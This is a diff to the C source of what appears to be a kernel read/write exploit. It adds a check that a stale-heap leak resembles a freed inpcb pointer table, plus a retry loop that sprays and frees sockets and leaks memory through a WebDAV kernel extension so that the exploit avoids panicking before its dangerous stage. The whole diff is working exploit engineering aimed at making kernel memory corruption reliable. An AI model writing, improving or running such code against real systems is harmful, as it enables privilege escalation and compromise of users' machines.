@@ -674,6 +674,30 @@ out:
 /* auto driver                                                         */
 /* ------------------------------------------------------------------ */
 
+/* A real leaked ripcb table is an array of pointers into the inpcb zone:
+ * nearly all entries sit inside one tight window.  Garbage leaks don't. */
+static int
+leak_looks_like_table(const uint64_t *cand, size_t ncand)
+{
+    const uint64_t WINDOW = 0x1000000ULL;   /* 16 MB */
+    size_t i, j, best = 0;
+
+    if (ncand < 200)
+        return 0;
+    for (i = 0; i < ncand; i++) {
+        size_t n = 0;
+        for (j = 0; j < ncand; j++) {
+            if (cand[j] >= cand[i] && cand[j] < cand[i] + WINDOW)
+                n++;
+        }
+        if (n > best)
+            best = n;
+    }
+    fprintf(stderr, "[krw] leak quality: %zu/%zu candidates in one 16 MB "
+            "window\n", best, ncand);
+    return best * 5 >= ncand * 3;   /* >= 60% clustered */
+}
+
 static void
 usage(const char *prog)
 {
@@ -779,23 +803,47 @@ main(int argc, char **argv)
         goto out;
     }
 
-    /* 2. spray to grow the ripcb table (kalloc_large), then free it so the
-     *    leak buffer reclaims the pages */
+    /* 2+3. spray + stale-heap leak, with a quality gate: only probe when
+     *    the leaked buffer really looks like the freed inpcb table (most
+     *    candidates inside one tight 16 MB window).  Probing garbage
+     *     candidates makes the kext dereference unmapped memory = panic. */
     {
-        inpcb_spray_t *sp = inpcb_spray_start(spray_n);
-        if (sp == NULL) {
-            fprintf(stderr, "[krw] spray failed\n");
+        int attempt;
+        int good = 0;
+
+        for (attempt = 0; attempt < 6 && !good; attempt++) {
+            inpcb_spray_t *sp;
+
+            if (attempt > 0)
+                fprintf(stderr, "[krw] retrying spray+leak "
+                        "(attempt %d/6)\n", attempt + 1);
+
+            sp = inpcb_spray_start(spray_n);
+            if (sp == NULL) {
+                fprintf(stderr, "[krw] spray failed\n");
+                goto out;
+            }
+            fprintf(stderr, "[krw] sprayed %d sockets, freeing\n",
+                    inpcb_spray_count(sp));
+            inpcb_spray_destroy(sp);
+
+            free(cand);
+            cand = NULL;
+            ncand = 0;
+            if (wdav_leak_candidates(wdav_url, wdav_mnt, &cand, &ncand) != 0) {
+                fprintf(stderr, "[krw] leak failed\n");
+                continue;
+            }
+            good = leak_looks_like_table(cand, ncand);
+            if (!good)
+                fprintf(stderr, "[krw] leak does not look like the inpcb "
+                        "table -- NOT probing it (would panic)\n");
+        }
+        if (!good) {
+            fprintf(stderr, "[krw] could not get a usable leak; aborting "
+                    "before the dangerous stage\n");
             goto out;
         }
-        fprintf(stderr, "[krw] sprayed %d sockets, freeing\n",
-                inpcb_spray_count(sp));
-        inpcb_spray_destroy(sp);
-    }
-
-    /* 3. stale-heap leak of the freed table(s) */
-    if (wdav_leak_candidates(wdav_url, wdav_mnt, &cand, &ncand) != 0) {
-        fprintf(stderr, "[krw] leak failed\n");
-        goto out;
     }
 
     /* 4. probe candidates until two identity sockets are matched */
